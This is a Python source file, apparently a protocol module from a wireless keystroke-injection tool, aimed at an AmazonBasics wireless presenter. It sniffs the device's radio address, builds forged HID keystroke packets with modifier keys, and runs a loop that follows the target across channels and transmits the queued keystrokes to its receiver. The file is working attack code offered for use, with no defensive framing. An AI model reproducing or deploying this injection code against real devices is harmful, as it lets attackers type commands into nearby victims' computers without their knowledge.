from protocol import Protocol
from lib import common
from collections import deque
from threading import Thread
import time
import logging
import crcmod
import struct


# AmazonBasics wireless presenter
class AmazonBasics(Protocol):

  # Constructor
  def __init__(self, address):

    self.address = address

    super(AmazonBasics, self).__init__("AmazonBasics")

    self.CRC16 = crcmod.mkCrcFun(0x11021, initCrc=0x0000, rev=False, xorOut=0x0000)
   
    self.LUT = [0]*256
    lut = [0x0, 0x8, 0x4, 0xC, 0x2, 0xA, 0x6, 0xE, 0x1, 0x9, 0x5, 0xD, 0x3, 0xB, 0x7, 0xF]
    for x in range(256):
      b = lut.index(x>>4) | (lut.index(x&0xf)<< 4)
      self.LUT[x] = b
      print(x, b)


  # Configure the radio
  def configure_radio(self):

    # Put the radio in sniffer mode
    common.radio.enter_sniffer_mode(self.address)

    # Set the channels to {2..76..1}
    common.channels = range(2, 76, 1)

    # Set the initial channel
    common.radio.set_channel(common.channels[0])


  def send_hid_event(self, scan_code=0, shift=False, ctrl=False, win=False):
    
    # Keystroke modifiers
    modifiers = 0x00
    if shift: modifiers |= 0x20
    if ctrl: modifiers |= 0x01
    if win: modifiers |= 0x08

    # Build and enqueue the payload
    payload = ("%02x:00:%02x:00:00:00:00:00:01" % (modifiers, scan_code)).replace(":", "").decode("hex")
    self.tx_queue.append(payload)


  # Enter injection mode
  def start_injection(self):

    # Start the TX loop
    self.cancel_tx_loop = False
    self.tx_queue = deque()
    self.tx_thread = Thread(target=self.tx_loop)
    self.tx_thread.daemon = True
    self.tx_thread.start()


  # TX loop
  def tx_loop(self):

    # Channel timeout
    timeout = 0.1 # 100ms

    # Parse the ping payload
    ping_payload = "\x00"

    # Format the ACK timeout and auto retry values
    ack_timeout = 1 # 500ms
    retries = 4

    # Sweep through the channels and decode ESB packets
    last_ping = time.time()
    channel_index = 0
    address_string = ':'.join("%02X" % ord(c) for c in self.address[::-1])
    while not self.cancel_tx_loop:

      # Follow the target device if it changes channels
      if time.time() - last_ping > timeout:

        # First try pinging on the active channel
        if not common.radio.transmit_payload(ping_payload, ack_timeout, retries):

          # Ping failed on the active channel, so sweep through all available channels
          success = False
          for channel_index in range(len(common.channels)):
            common.radio.set_channel(common.channels[channel_index])
            if common.radio.transmit_payload(ping_payload, ack_timeout, retries):

              # Ping successful, exit out of the ping sweep
              last_ping = time.time()
              logging.debug('Ping success on channel {0}'.format(common.channels[channel_index]))
              success = True
              break

          # Ping sweep failed
          if not success: logging.debug('Unable to ping {0}'.format(address_string))

        # Ping succeeded on the active channel
        else:
          logging.debug('Ping success on channel {0}'.format(common.channels[channel_index]))
          last_ping = time.time()

      # Read from the queue
      if len(self.tx_queue):

        # Transmit the queued packet
        payload = self.tx_queue.popleft()
        if not common.radio.transmit_payload(payload, ack_timeout, retries):
          self.tx_queue.appendleft(payload)

  # Leave injection mode
  def stop_injection(self):
    while len(self.tx_queue):
      time.sleep(0.001)
      continue
    self.cancel_tx_loop = True
    self.tx_thread.join()          